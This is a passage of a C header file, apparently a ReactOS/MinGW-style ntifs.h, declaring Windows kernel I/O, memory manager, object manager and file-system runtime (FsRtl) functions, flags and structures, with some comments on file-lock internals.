  IN PLARGE_INTEGER FileOffset,
  IN PKEVENT Event,
  OUT PIO_STATUS_BLOCK IoStatusBlock);

NTKERNELAPI
PEPROCESS
NTAPI
IoThreadToProcess(
  IN PETHREAD Thread);

NTKERNELAPI
VOID
NTAPI
IoUnregisterFileSystem(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
VOID
NTAPI
IoUnregisterFsRegistrationChange(
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_FS_NOTIFICATION DriverNotificationRoutine);

NTKERNELAPI
NTSTATUS
NTAPI
IoVerifyVolume(
  IN PDEVICE_OBJECT DeviceObject,
  IN BOOLEAN AllowRawMount);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetRequestorSessionId(
  IN PIRP Irp,
  OUT PULONG pSessionId);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
PFILE_OBJECT
NTAPI
IoCreateStreamFileObjectEx(
  IN PFILE_OBJECT FileObject OPTIONAL,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL,
  OUT PHANDLE FileObjectHandle OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoQueryFileDosDeviceName(
  IN PFILE_OBJECT FileObject,
  OUT POBJECT_NAME_INFORMATION *ObjectNameInformation);

NTKERNELAPI
NTSTATUS
NTAPI
IoEnumerateDeviceObjectList(
  IN PDRIVER_OBJECT DriverObject,
  OUT PDEVICE_OBJECT *DeviceObjectList,
  IN ULONG DeviceObjectListSize,
  OUT PULONG ActualNumberDeviceObjects);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetLowerDeviceObject(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetDeviceAttachmentBaseRef(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDiskDeviceObject(
  IN PDEVICE_OBJECT FileSystemDeviceObject,
  OUT PDEVICE_OBJECT *DiskDeviceObject);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03SP1)

NTKERNELAPI
NTSTATUS
NTAPI
IoEnumerateRegisteredFiltersList(
  OUT PDRIVER_OBJECT *DriverObjectList,
  IN ULONG DriverObjectListSize,
  OUT PULONG ActualNumberDriverObjects);
#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

FORCEINLINE
VOID
NTAPI
IoInitializePriorityInfo(
  IN PIO_PRIORITY_INFO PriorityInfo)
{
  PriorityInfo->Size = sizeof(IO_PRIORITY_INFO);
  PriorityInfo->ThreadPriority = 0xffff;
  PriorityInfo->IoPriority = IoPriorityNormal;
  PriorityInfo->PagePriority = 0;
}
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterFsRegistrationChangeMountAware(
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_FS_NOTIFICATION DriverNotificationRoutine,
  IN BOOLEAN SynchronizeWithMounts);

NTKERNELAPI
NTSTATUS
NTAPI
IoReplaceFileObjectName(
  IN PFILE_OBJECT FileObject,
  IN PWSTR NewFileName,
  IN USHORT FileNameLength);
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */


#define PO_CB_SYSTEM_POWER_POLICY       0
#define PO_CB_AC_STATUS                 1
#define PO_CB_BUTTON_COLLISION          2
#define PO_CB_SYSTEM_STATE_LOCK         3
#define PO_CB_LID_SWITCH_STATE          4
#define PO_CB_PROCESSOR_POWER_POLICY    5


#if (NTDDI_VERSION >= NTDDI_WINXP)
NTKERNELAPI
NTSTATUS
NTAPI
PoQueueShutdownWorkItem(
  IN OUT PWORK_QUEUE_ITEM WorkItem);
#endif

/******************************************************************************
 *                         Memory manager Types                               *
 ******************************************************************************/

typedef enum _MMFLUSH_TYPE {
  MmFlushForDelete,
  MmFlushForWrite
} MMFLUSH_TYPE;

typedef struct _READ_LIST {
  PFILE_OBJECT FileObject;
  ULONG NumberOfEntries;
  LOGICAL IsImage;
  FILE_SEGMENT_ELEMENT List[ANYSIZE_ARRAY];
} READ_LIST, *PREAD_LIST;

#if (NTDDI_VERSION >= NTDDI_WINXP)

typedef union _MM_PREFETCH_FLAGS {
  struct {
    ULONG Priority : SYSTEM_PAGE_PRIORITY_BITS;
    ULONG RepurposePriority : SYSTEM_PAGE_PRIORITY_BITS;
  } Flags;
  ULONG AllFlags;
} MM_PREFETCH_FLAGS, *PMM_PREFETCH_FLAGS;

#define MM_PREFETCH_FLAGS_MASK ((1 << (2*SYSTEM_PAGE_PRIORITY_BITS)) - 1)

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#define HEAP_NO_SERIALIZE               0x00000001
#define HEAP_GROWABLE                   0x00000002
#define HEAP_GENERATE_EXCEPTIONS        0x00000004
#define HEAP_ZERO_MEMORY                0x00000008
#define HEAP_REALLOC_IN_PLACE_ONLY      0x00000010
#define HEAP_TAIL_CHECKING_ENABLED      0x00000020
#define HEAP_FREE_CHECKING_ENABLED      0x00000040
#define HEAP_DISABLE_COALESCE_ON_FREE   0x00000080

#define HEAP_CREATE_ALIGN_16            0x00010000
#define HEAP_CREATE_ENABLE_TRACING      0x00020000
#define HEAP_CREATE_ENABLE_EXECUTE      0x00040000

#define HEAP_SETTABLE_USER_VALUE        0x00000100
#define HEAP_SETTABLE_USER_FLAG1        0x00000200
#define HEAP_SETTABLE_USER_FLAG2        0x00000400
#define HEAP_SETTABLE_USER_FLAG3        0x00000800
#define HEAP_SETTABLE_USER_FLAGS        0x00000E00

#define HEAP_CLASS_0                    0x00000000
#define HEAP_CLASS_1                    0x00001000
#define HEAP_CLASS_2                    0x00002000
#define HEAP_CLASS_3                    0x00003000
#define HEAP_CLASS_4                    0x00004000
#define HEAP_CLASS_5                    0x00005000
#define HEAP_CLASS_6                    0x00006000
#define HEAP_CLASS_7                    0x00007000
#define HEAP_CLASS_8                    0x00008000
#define HEAP_CLASS_MASK                 0x0000F000

#define HEAP_MAXIMUM_TAG                0x0FFF
#define HEAP_GLOBAL_TAG                 0x0800
#define HEAP_PSEUDO_TAG_FLAG            0x8000
#define HEAP_TAG_SHIFT                  18
#define HEAP_TAG_MASK                  (HEAP_MAXIMUM_TAG << HEAP_TAG_SHIFT)

#define HEAP_CREATE_VALID_MASK         (HEAP_NO_SERIALIZE             |   \
                                        HEAP_GROWABLE                 |   \
                                        HEAP_GENERATE_EXCEPTIONS      |   \
                                        HEAP_ZERO_MEMORY              |   \
                                        HEAP_REALLOC_IN_PLACE_ONLY    |   \
                                        HEAP_TAIL_CHECKING_ENABLED    |   \
                                        HEAP_FREE_CHECKING_ENABLED    |   \
                                        HEAP_DISABLE_COALESCE_ON_FREE |   \
                                        HEAP_CLASS_MASK               |   \
                                        HEAP_CREATE_ALIGN_16          |   \
                                        HEAP_CREATE_ENABLE_TRACING    |   \
                                        HEAP_CREATE_ENABLE_EXECUTE)

/******************************************************************************
 *                       Memory manager Functions                             *
 ******************************************************************************/

FORCEINLINE
ULONG
HEAP_MAKE_TAG_FLAGS(
  IN ULONG TagBase,
  IN ULONG Tag)
{
  //__assume_bound(TagBase); // FIXME
  return ((ULONG)((TagBase) + ((Tag) << HEAP_TAG_SHIFT)));
}

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
BOOLEAN
NTAPI
MmIsRecursiveIoFault(
  VOID);

NTKERNELAPI
BOOLEAN
NTAPI
MmForceSectionClosed(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN BOOLEAN DelayClose);

NTKERNELAPI
BOOLEAN
NTAPI
MmFlushImageSection(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN MMFLUSH_TYPE FlushType);

NTKERNELAPI
BOOLEAN
NTAPI
MmCanFileBeTruncated(
  IN PSECTION_OBJECT_POINTERS SectionObjectPointer,
  IN PLARGE_INTEGER NewFileSize OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
MmSetAddressRangeModified(
  IN PVOID Address,
  IN SIZE_T Length);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
NTSTATUS
NTAPI
MmPrefetchPages(
  IN ULONG NumberOfLists,
  IN PREAD_LIST *ReadLists);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */


#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
ULONG
NTAPI
MmDoesFileHaveUserWritableReferences(
  IN PSECTION_OBJECT_POINTERS SectionPointer);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */


#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
NTSTATUS
NTAPI
ObInsertObject(
  IN PVOID Object,
  IN OUT PACCESS_STATE PassedAccessState OPTIONAL,
  IN ACCESS_MASK DesiredAccess OPTIONAL,
  IN ULONG ObjectPointerBias,
  OUT PVOID *NewObject OPTIONAL,
  OUT PHANDLE Handle OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
ObOpenObjectByPointer(
  IN PVOID Object,
  IN ULONG HandleAttributes,
  IN PACCESS_STATE PassedAccessState OPTIONAL,
  IN ACCESS_MASK DesiredAccess OPTIONAL,
  IN POBJECT_TYPE ObjectType OPTIONAL,
  IN KPROCESSOR_MODE AccessMode,
  OUT PHANDLE Handle);

NTKERNELAPI
VOID
NTAPI
ObMakeTemporaryObject(
  IN PVOID Object);

NTKERNELAPI
NTSTATUS
NTAPI
ObQueryNameString(
  IN PVOID Object,
  OUT POBJECT_NAME_INFORMATION ObjectNameInfo OPTIONAL,
  IN ULONG Length,
  OUT PULONG ReturnLength);

NTKERNELAPI
NTSTATUS
NTAPI
ObQueryObjectAuditingByHandle(
  IN HANDLE Handle,
  OUT PBOOLEAN GenerateOnClose);
#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
BOOLEAN
NTAPI
ObIsKernelHandle(
  IN HANDLE Handle);
#endif


#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
NTSTATUS
NTAPI
ObOpenObjectByPointerWithTag(
  IN PVOID Object,
  IN ULONG HandleAttributes,
  IN PACCESS_STATE PassedAccessState OPTIONAL,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_TYPE ObjectType OPTIONAL,
  IN KPROCESSOR_MODE AccessMode,
  IN ULONG Tag,
  OUT PHANDLE Handle);
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

/* FSRTL Types */

typedef ULONG LBN;
typedef LBN *PLBN;

typedef ULONG VBN;
typedef VBN *PVBN;

#define FSRTL_COMMON_FCB_HEADER_LAYOUT \
  CSHORT NodeTypeCode; \
  CSHORT NodeByteSize; \
  UCHAR Flags; \
  UCHAR IsFastIoPossible; \
  UCHAR Flags2; \
  UCHAR Reserved:4; \
  UCHAR Version:4; \
  PERESOURCE Resource; \
  PERESOURCE PagingIoResource; \
  LARGE_INTEGER AllocationSize; \
  LARGE_INTEGER FileSize; \
  LARGE_INTEGER ValidDataLength;

typedef struct _FSRTL_COMMON_FCB_HEADER {
  FSRTL_COMMON_FCB_HEADER_LAYOUT
} FSRTL_COMMON_FCB_HEADER, *PFSRTL_COMMON_FCB_HEADER;

#ifdef __cplusplus
typedef struct _FSRTL_ADVANCED_FCB_HEADER:FSRTL_COMMON_FCB_HEADER {
#else /* __cplusplus */
typedef struct _FSRTL_ADVANCED_FCB_HEADER {
  FSRTL_COMMON_FCB_HEADER_LAYOUT
#endif  /* __cplusplus */
  PFAST_MUTEX FastMutex;
  LIST_ENTRY FilterContexts;
#if (NTDDI_VERSION >= NTDDI_VISTA)
  EX_PUSH_LOCK PushLock;
  PVOID *FileContextSupportPointer;
#endif
} FSRTL_ADVANCED_FCB_HEADER, *PFSRTL_ADVANCED_FCB_HEADER;

#define FSRTL_FCB_HEADER_V0             (0x00)
#define FSRTL_FCB_HEADER_V1             (0x01)

#define FSRTL_FLAG_FILE_MODIFIED        (0x01)
#define FSRTL_FLAG_FILE_LENGTH_CHANGED  (0x02)
#define FSRTL_FLAG_LIMIT_MODIFIED_PAGES (0x04)
#define FSRTL_FLAG_ACQUIRE_MAIN_RSRC_EX (0x08)
#define FSRTL_FLAG_ACQUIRE_MAIN_RSRC_SH (0x10)
#define FSRTL_FLAG_USER_MAPPED_FILE     (0x20)
#define FSRTL_FLAG_ADVANCED_HEADER      (0x40)
#define FSRTL_FLAG_EOF_ADVANCE_ACTIVE   (0x80)

#define FSRTL_FLAG2_DO_MODIFIED_WRITE        (0x01)
#define FSRTL_FLAG2_SUPPORTS_FILTER_CONTEXTS (0x02)
#define FSRTL_FLAG2_PURGE_WHEN_MAPPED        (0x04)
#define FSRTL_FLAG2_IS_PAGING_FILE           (0x08)

#define FSRTL_FSP_TOP_LEVEL_IRP         (0x01)
#define FSRTL_CACHE_TOP_LEVEL_IRP       (0x02)
#define FSRTL_MOD_WRITE_TOP_LEVEL_IRP   (0x03)
#define FSRTL_FAST_IO_TOP_LEVEL_IRP     (0x04)
#define FSRTL_NETWORK1_TOP_LEVEL_IRP    ((LONG_PTR)0x05)
#define FSRTL_NETWORK2_TOP_LEVEL_IRP    ((LONG_PTR)0x06)
#define FSRTL_MAX_TOP_LEVEL_IRP_FLAG    ((LONG_PTR)0xFFFF)

typedef struct _FSRTL_AUXILIARY_BUFFER {
  PVOID Buffer;
  ULONG Length;
  ULONG Flags;
  PMDL Mdl;
} FSRTL_AUXILIARY_BUFFER, *PFSRTL_AUXILIARY_BUFFER;

#define FSRTL_AUXILIARY_FLAG_DEALLOCATE 0x00000001

typedef enum _FSRTL_COMPARISON_RESULT {
  LessThan = -1,
  EqualTo = 0,
  GreaterThan = 1
} FSRTL_COMPARISON_RESULT;

#define FSRTL_FAT_LEGAL                 0x01
#define FSRTL_HPFS_LEGAL                0x02
#define FSRTL_NTFS_LEGAL                0x04
#define FSRTL_WILD_CHARACTER            0x08
#define FSRTL_OLE_LEGAL                 0x10
#define FSRTL_NTFS_STREAM_LEGAL         (FSRTL_NTFS_LEGAL | FSRTL_OLE_LEGAL)

#define FSRTL_VOLUME_DISMOUNT           1
#define FSRTL_VOLUME_DISMOUNT_FAILED    2
#define FSRTL_VOLUME_LOCK               3
#define FSRTL_VOLUME_LOCK_FAILED        4
#define FSRTL_VOLUME_UNLOCK             5
#define FSRTL_VOLUME_MOUNT              6
#define FSRTL_VOLUME_NEEDS_CHKDSK       7
#define FSRTL_VOLUME_WORM_NEAR_FULL     8
#define FSRTL_VOLUME_WEARING_OUT        9
#define FSRTL_VOLUME_FORCED_CLOSED      10
#define FSRTL_VOLUME_INFO_MAKE_COMPAT   11
#define FSRTL_VOLUME_PREPARING_EJECT    12
#define FSRTL_VOLUME_CHANGE_SIZE        13
#define FSRTL_VOLUME_BACKGROUND_FORMAT  14

typedef VOID
(NTAPI *PFSRTL_STACK_OVERFLOW_ROUTINE) (
  IN PVOID Context,
  IN PKEVENT Event);

#if (NTDDI_VERSION >= NTDDI_VISTA)

#define FSRTL_UNC_PROVIDER_FLAGS_MAILSLOTS_SUPPORTED    0x00000001
#define FSRTL_UNC_PROVIDER_FLAGS_CSC_ENABLED            0x00000002
#define FSRTL_UNC_PROVIDER_FLAGS_DOMAIN_SVC_AWARE       0x00000004

#define FSRTL_ALLOCATE_ECPLIST_FLAG_CHARGE_QUOTA           0x00000001

#define FSRTL_ALLOCATE_ECP_FLAG_CHARGE_QUOTA               0x00000001
#define FSRTL_ALLOCATE_ECP_FLAG_NONPAGED_POOL              0x00000002

#define FSRTL_ECP_LOOKASIDE_FLAG_NONPAGED_POOL             0x00000002

#define FSRTL_VIRTDISK_FULLY_ALLOCATED  0x00000001
#define FSRTL_VIRTDISK_NO_DRIVE_LETTER  0x00000002

typedef struct _FSRTL_MUP_PROVIDER_INFO_LEVEL_1 {
  ULONG32 ProviderId;
} FSRTL_MUP_PROVIDER_INFO_LEVEL_1, *PFSRTL_MUP_PROVIDER_INFO_LEVEL_1;

typedef struct _FSRTL_MUP_PROVIDER_INFO_LEVEL_2 {
  ULONG32 ProviderId;
  UNICODE_STRING ProviderName;
} FSRTL_MUP_PROVIDER_INFO_LEVEL_2, *PFSRTL_MUP_PROVIDER_INFO_LEVEL_2;

typedef VOID
(*PFSRTL_EXTRA_CREATE_PARAMETER_CLEANUP_CALLBACK) (
  IN OUT PVOID EcpContext,
  IN LPCGUID EcpType);

typedef struct _ECP_LIST ECP_LIST, *PECP_LIST;

typedef ULONG FSRTL_ALLOCATE_ECPLIST_FLAGS;
typedef ULONG FSRTL_ALLOCATE_ECP_FLAGS;
typedef ULONG FSRTL_ECP_LOOKASIDE_FLAGS;

typedef enum _FSRTL_CHANGE_BACKING_TYPE {
  ChangeDataControlArea,
  ChangeImageControlArea,
  ChangeSharedCacheMap
} FSRTL_CHANGE_BACKING_TYPE, *PFSRTL_CHANGE_BACKING_TYPE;

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

typedef struct _FSRTL_PER_FILE_CONTEXT {
  LIST_ENTRY Links;
  PVOID OwnerId;
  PVOID InstanceId;
  PFREE_FUNCTION FreeCallback;
} FSRTL_PER_FILE_CONTEXT, *PFSRTL_PER_FILE_CONTEXT;

typedef struct _FSRTL_PER_STREAM_CONTEXT {
  LIST_ENTRY Links;
  PVOID OwnerId;
  PVOID InstanceId;
  PFREE_FUNCTION FreeCallback;
} FSRTL_PER_STREAM_CONTEXT, *PFSRTL_PER_STREAM_CONTEXT;

#if (NTDDI_VERSION >= NTDDI_WIN2K)
typedef VOID
(*PFN_FSRTLTEARDOWNPERSTREAMCONTEXTS) (
  IN PFSRTL_ADVANCED_FCB_HEADER AdvancedHeader);
#endif

typedef struct _FSRTL_PER_FILEOBJECT_CONTEXT {
  LIST_ENTRY Links;
  PVOID OwnerId;
  PVOID InstanceId;
} FSRTL_PER_FILEOBJECT_CONTEXT, *PFSRTL_PER_FILEOBJECT_CONTEXT;

#define FSRTL_CC_FLUSH_ERROR_FLAG_NO_HARD_ERROR  0x1
#define FSRTL_CC_FLUSH_ERROR_FLAG_NO_LOG_ENTRY   0x2

typedef NTSTATUS
(NTAPI *PCOMPLETE_LOCK_IRP_ROUTINE) (
  IN PVOID Context,
  IN PIRP Irp);

typedef struct _FILE_LOCK_INFO {
  LARGE_INTEGER StartingByte;
  LARGE_INTEGER Length;
  BOOLEAN ExclusiveLock;
  ULONG Key;
  PFILE_OBJECT FileObject;
  PVOID ProcessId;
  LARGE_INTEGER EndingByte;
} FILE_LOCK_INFO, *PFILE_LOCK_INFO;

typedef VOID
(NTAPI *PUNLOCK_ROUTINE) (
  IN PVOID Context,
  IN PFILE_LOCK_INFO FileLockInfo);

typedef struct _FILE_LOCK {
  PCOMPLETE_LOCK_IRP_ROUTINE CompleteLockIrpRoutine;
  PUNLOCK_ROUTINE UnlockRoutine;
  BOOLEAN FastIoIsQuestionable;
  BOOLEAN SpareC[3];
  PVOID LockInformation;
  FILE_LOCK_INFO LastReturnedLockInfo;
  PVOID LastReturnedLock;
  LONG volatile LockRequestsInProgress;
} FILE_LOCK, *PFILE_LOCK;

typedef struct _TUNNEL {
  FAST_MUTEX Mutex;
  PRTL_SPLAY_LINKS Cache;
  LIST_ENTRY TimerQueue;
  USHORT NumEntries;
} TUNNEL, *PTUNNEL;

typedef struct _BASE_MCB {
  ULONG MaximumPairCount;
  ULONG PairCount;
  USHORT PoolType;
  USHORT Flags;
  PVOID Mapping;
} BASE_MCB, *PBASE_MCB;

typedef struct _LARGE_MCB {
  PKGUARDED_MUTEX GuardedMutex;
  BASE_MCB BaseMcb;
} LARGE_MCB, *PLARGE_MCB;

#define MCB_FLAG_RAISE_ON_ALLOCATION_FAILURE 1

typedef struct _MCB {
  LARGE_MCB DummyFieldThatSizesThisStructureCorrectly;
} MCB, *PMCB;

typedef enum _FAST_IO_POSSIBLE {
  FastIoIsNotPossible = 0,
  FastIoIsPossible,
  FastIoIsQuestionable
} FAST_IO_POSSIBLE;

typedef struct _EOF_WAIT_BLOCK {
  LIST_ENTRY EofWaitLinks;
  KEVENT Event;
} EOF_WAIT_BLOCK, *PEOF_WAIT_BLOCK;

typedef PVOID OPLOCK, *POPLOCK;

typedef VOID
(NTAPI *POPLOCK_WAIT_COMPLETE_ROUTINE) (
  IN PVOID Context,
  IN PIRP Irp);

typedef VOID
(NTAPI *POPLOCK_FS_PREPOST_IRP) (
  IN PVOID Context,
  IN PIRP Irp);

#if (NTDDI_VERSION >= NTDDI_VISTASP1)
#define OPLOCK_FLAG_COMPLETE_IF_OPLOCKED    0x00000001
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)
#define OPLOCK_FLAG_OPLOCK_KEY_CHECK_ONLY   0x00000002
#define OPLOCK_FLAG_BACK_OUT_ATOMIC_OPLOCK  0x00000004
#define OPLOCK_FLAG_IGNORE_OPLOCK_KEYS      0x00000008
#define OPLOCK_FSCTRL_FLAG_ALL_KEYS_MATCH   0x00000001
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)

typedef struct _OPLOCK_KEY_ECP_CONTEXT {
  GUID OplockKey;
  ULONG Reserved;
} OPLOCK_KEY_ECP_CONTEXT, *POPLOCK_KEY_ECP_CONTEXT;

DEFINE_GUID(GUID_ECP_OPLOCK_KEY, 0x48850596, 0x3050, 0x4be7, 0x98, 0x63, 0xfe, 0xc3, 0x50, 0xce, 0x8d, 0x7f);

#endif

typedef PVOID PNOTIFY_SYNC;

#if (NTDDI_VERSION >= NTDDI_WIN7)
typedef struct _ECP_HEADER ECP_HEADER, *PECP_HEADER;
#endif

typedef BOOLEAN
(NTAPI *PCHECK_FOR_TRAVERSE_ACCESS) (
  IN PVOID NotifyContext,
  IN PVOID TargetContext OPTIONAL,
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext);

typedef BOOLEAN
(NTAPI *PFILTER_REPORT_CHANGE) (
  IN PVOID NotifyContext,
  IN PVOID FilterContext);
/* FSRTL Functions */

#define FsRtlEnterFileSystem    KeEnterCriticalRegion
#define FsRtlExitFileSystem     KeLeaveCriticalRegion

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCopyRead(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  IN ULONG LockKey,
  OUT PVOID Buffer,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCopyWrite(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN BOOLEAN Wait,
  IN ULONG LockKey,
  IN PVOID Buffer,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlMdlReadDev(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG LockKey,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlMdlReadCompleteDev(
  IN PFILE_OBJECT FileObject,
  IN PMDL MdlChain,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlPrepareMdlWriteDev(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN ULONG Length,
  IN ULONG LockKey,
  OUT PMDL *MdlChain,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlMdlWriteCompleteDev(
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PMDL MdlChain,
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
VOID
NTAPI
FsRtlAcquireFileExclusive(
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
VOID
NTAPI
FsRtlReleaseFile(
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlGetFileSize(
  IN PFILE_OBJECT FileObject,
  OUT PLARGE_INTEGER FileSize);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsTotalDeviceFailure(
  IN NTSTATUS Status);

NTKERNELAPI
PFILE_LOCK
NTAPI
FsRtlAllocateFileLock(
  IN PCOMPLETE_LOCK_IRP_ROUTINE CompleteLockIrpRoutine OPTIONAL,
  IN PUNLOCK_ROUTINE UnlockRoutine OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlFreeFileLock(
  IN PFILE_LOCK FileLock);

NTKERNELAPI
VOID
NTAPI
FsRtlInitializeFileLock(
  IN PFILE_LOCK FileLock,
  IN PCOMPLETE_LOCK_IRP_ROUTINE CompleteLockIrpRoutine OPTIONAL,
  IN PUNLOCK_ROUTINE UnlockRoutine OPTIONAL);

NTKERNELAPI
VOID
NTAPI
FsRtlUninitializeFileLock(
  IN PFILE_LOCK FileLock);

/*
  FsRtlProcessFileLock:

  ret:
    -STATUS_INVALID_DEVICE_REQUEST
    -STATUS_RANGE_NOT_LOCKED from unlock routines.
    -STATUS_PENDING, STATUS_LOCK_NOT_GRANTED from FsRtlPrivateLock
    (redirected IoStatus->Status).

  Internals:
    -switch ( Irp->CurrentStackLocation->MinorFunction )
        lock: return FsRtlPrivateLock;
        unlocksingle: return FsRtlFastUnlockSingle;
        unlockall: return FsRtlFastUnlockAll;
        unlockallbykey: return FsRtlFastUnlockAllByKey;
        default: IofCompleteRequest with STATUS_INVALID_DEVICE_REQUEST;
                 return STATUS_INVALID_DEVICE_REQUEST;

    -'AllwaysZero' is passed thru as 'AllwaysZero' to lock / unlock routines.
    -'Irp' is passet thru as 'Irp' to FsRtlPrivateLock.
*/
NTKERNELAPI
NTSTATUS
NTAPI
FsRtlProcessFileLock(
  IN PFILE_LOCK FileLock,
  IN PIRP Irp,
  IN PVOID Context OPTIONAL);

/*
  FsRtlCheckLockForReadAccess:

  All this really does is pick out the lock parameters from the irp (io stack
  location?), get IoGetRequestorProcess, and pass values on to
  FsRtlFastCheckLockForRead.
*/
NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCheckLockForReadAccess(
  IN PFILE_LOCK FileLock,
  IN PIRP Irp);

/*
  FsRtlCheckLockForWriteAccess:

  All this really does is pick out the lock parameters from the irp (io stack
  location?), get IoGetRequestorProcess, and pass values on to
  FsRtlFastCheckLockForWrite.
*/
NTKERNELAPI
BOOLEAN
NTAPI
FsRtlCheckLockForWriteAccess(
  IN PFILE_LOCK FileLock,
  IN PIRP Irp);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlFastCheckLockForRead(
  IN PFILE_LOCK FileLock,
  IN PLARGE_INTEGER FileOffset,
  IN PLARGE_INTEGER Length,
  IN ULONG Key,
  IN PFILE_OBJECT FileObject,
  IN PVOID Process);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlFastCheckLockForWrite(
  IN PFILE_LOCK FileLock,
  IN PLARGE_INTEGER FileOffset,
  IN PLARGE_INTEGER Length,
  IN ULONG Key,
  IN PFILE_OBJECT FileObject,
  IN PVOID Process);

/*
  FsRtlGetNextFileLock:

  ret: NULL if no more locks

  Internals:
    FsRtlGetNextFileLock uses FileLock->LastReturnedLockInfo and
    FileLock->LastReturnedLock as storage.
    LastReturnedLock is a pointer to the 'raw' lock inkl. double linked
    list, and FsRtlGetNextFileLock needs this to get next lock on subsequent
    calls with Restart = FALSE.
*/
NTKERNELAPI
PFILE_LOCK_INFO
NTAPI
FsRtlGetNextFileLock(
  IN PFILE_LOCK FileLock,
  IN BOOLEAN Restart);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlFastUnlockSingle(
  IN PFILE_LOCK FileLock,
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PLARGE_INTEGER Length,
  IN PEPROCESS Process,
  IN ULONG Key,
  IN PVOID Context OPTIONAL,
  IN BOOLEAN AlreadySynchronized);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlFastUnlockAll(
  IN PFILE_LOCK FileLock,
  IN PFILE_OBJECT FileObject,
  IN PEPROCESS Process,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
FsRtlFastUnlockAllByKey(
  IN PFILE_LOCK FileLock,
  IN PFILE_OBJECT FileObject,
  IN PEPROCESS Process,
  IN ULONG Key,
  IN PVOID Context OPTIONAL);

/*
  FsRtlPrivateLock:

  ret: IoStatus->Status: STATUS_PENDING, STATUS_LOCK_NOT_GRANTED

  Internals:
    -Calls IoCompleteRequest if Irp
    -Uses exception handling / ExRaiseStatus with STATUS_INSUFFICIENT_RESOURCES
*/
NTKERNELAPI
BOOLEAN
NTAPI
FsRtlPrivateLock(
  IN PFILE_LOCK FileLock,
  IN PFILE_OBJECT FileObject,
  IN PLARGE_INTEGER FileOffset,
  IN PLARGE_INTEGER Length,
  IN PEPROCESS Process,
  IN ULONG Key,
  IN BOOLEAN FailImmediately,
  IN BOOLEAN ExclusiveLock,
  OUT PIO_STATUS_BLOCK IoStatus,
  IN PIRP Irp OPTIONAL,
  IN PVOID Context,
  IN BOOLEAN AlreadySynchronized);

NTKERNELAPI
VOID
NTAPI
